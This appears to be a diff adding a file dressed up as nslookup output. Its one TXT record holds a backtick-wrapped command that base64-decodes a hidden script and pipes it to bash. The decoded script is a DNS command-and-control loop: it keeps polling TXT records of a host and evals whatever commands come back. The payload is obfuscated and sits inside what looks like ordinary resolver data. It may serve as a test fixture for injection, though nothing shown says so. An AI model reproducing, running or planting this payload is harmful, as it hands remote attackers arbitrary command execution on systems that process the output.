@@ -1,0 +1,8 @@
+Server:		localhost
+Address:	127.0.0.1#53
+
+Non-authoritative answer:
+x1	text = "`{echo,d2hpbGUgWyAiJG0iICE9ICJlIiBdO2RvIG5zbG9va3VwIC10eXBlPXR4dCBxLmxvY2FsaG9zdHxncmVwIC1vICciW14iXVwrIid8d2hpbGUgcmVhZCBtO2RvO2lmIFsgIiRtIiAhPSAiJG4iIF0gJiYgWyAkeyNtfSAtZ3QgMSBdO3RoZW4gbj0kbTtldmFsICRtO2ZpO2RvbmU7ZG9uZQ==}|{base64,--decode}|bash`"
+
+Authoritative answers can be found from:
+
